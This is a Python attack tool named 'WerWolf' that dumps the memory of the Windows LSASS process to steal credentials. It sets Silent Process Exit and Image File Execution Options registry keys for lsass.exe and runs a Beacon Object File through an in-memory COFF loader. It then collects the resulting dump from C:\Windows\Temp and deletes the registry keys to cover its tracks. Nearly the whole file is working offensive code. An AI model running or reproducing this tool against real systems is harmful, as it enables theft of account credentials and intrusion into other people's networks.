import sys
import os
import time
import glob
import logging
import platform


BANNER = r"""
                          ..
                         / _}
                  _     /  /
                / `\  /  /
                \   \/  /     WerWolf
                 \     /      --------
             ,    )   (       LSASS Credential Dumper
            / \_ / \   \      via RtlReportSilentProcessExit
           /       /    \
          /   __  /   _  \    Abusing Windows Error Reporting
         /   /  \/   / \  |   In-Memory COFF/BOF Loader
        |   /   /   /   | |
         \_/   /   /  _/ /
               \__/\_/ \_/
"""

BOF_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bofs", "wer_execute.o")

DUMP_DIR = r"C:\Windows\Temp"

# Registry paths for Silent Process Exit
IFEO_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe"
SILENT_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"


def setup_registry():
    """Set (or re-set) the Silent Process Exit registry keys."""
    import winreg

    # IFEO GlobalFlag = 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "GlobalFlag", 0, winreg.REG_DWORD, 0x200)
    winreg.CloseKey(key)

    # SilentProcessExit config
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "ReportingMode", 0, winreg.REG_DWORD, 0x2)
    winreg.SetValueEx(key, "LocalDumpFolder", 0, winreg.REG_SZ, DUMP_DIR)
    winreg.SetValueEx(key, "DumpType", 0, winreg.REG_DWORD, 0x2)
    winreg.CloseKey(key)


def cleanup_registry():
    """Remove the Silent Process Exit registry keys."""
    import winreg

    try:
        key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, IFEO_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, "GlobalFlag")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except OSError:
        pass

    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, SILENT_KEY)
    except OSError:
        pass


def find_dumps():
    """Search for dump files, including in subdirectories."""
    found = []
    for pattern in [
        os.path.join(DUMP_DIR, "lsass*.dmp"),
        os.path.join(DUMP_DIR, "*.dmp"),
        os.path.join(DUMP_DIR, "lsass*", "*.dmp"),
        os.path.join(DUMP_DIR, "lsass*", "**", "*.dmp"),
    ]:
        found.extend(glob.glob(pattern, recursive=True))
    proof = glob.glob(os.path.join(DUMP_DIR, "wer_proof*"))
    return list(set(found)), proof


def main():
    verbose = "-v" in sys.argv or "--verbose" in sys.argv

    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format="[%(levelname)s] %(message)s")

    print(BANNER)

    if not os.path.isfile(BOF_PATH):
        print(f"[!] BOF not found: {BOF_PATH}")
        sys.exit(1)

    if platform.system() != "Windows":
        print("\n[!] Execution requires Windows.")
        sys.exit(1)

    with open(BOF_PATH, "rb") as f:
        coff_data = f.read()

    print(f"[*] BOF file   : {BOF_PATH}")
    print(f"[*] File size  : {len(coff_data):,} bytes")
    print(f"[*] Entry point: go")
    print(f"[*] Platform   : {platform.system()} {platform.machine()}")
    print()

    # Pre-set registry keys so they exist before the BOF runs
    print("[*] Setting up Silent Process Exit registry keys...")
    setup_registry()

    # Load and execute the BOF
    from loader.loader import CoffLoader

    loader = CoffLoader()
    loader.load_and_execute(coff_data, entry_name="go")

    # The BOF cleans up registry after RtlReportSilentProcessExit,
    # but WerFault reads the config asynchronously. Re-set the keys
    # so WerFault can still find them when it starts processing.
    print()
    print("[*] Re-setting registry keys for WerFault (race condition fix)...")
    setup_registry()

    print("[*] Waiting for WerFault to write the dump...")

    for i in range(45):
        dumps, proofs = find_dumps()
        if proofs and i < 2:
            print(f"[+] WER triggered: {proofs[0]}")
        if dumps:
            for d in dumps:
                try:
                    size_mb = os.path.getsize(d) / (1024 * 1024)
                    print(f"[+] Dump found: {d} ({size_mb:.1f} MB)")
                except OSError:
                    print(f"[+] Dump found: {d} (still writing...)")
            break
        time.sleep(2)
    else:
        print(f"[!] No dump found after 90 seconds.")
        print(f"[*] Check {DUMP_DIR} and subdirectories manually.")

    # Now clean up the registry keys from Python
    print("[*] Cleaning up registry keys...")
    cleanup_registry()

    print()
    print("=" * 60)
    print("  Execution complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
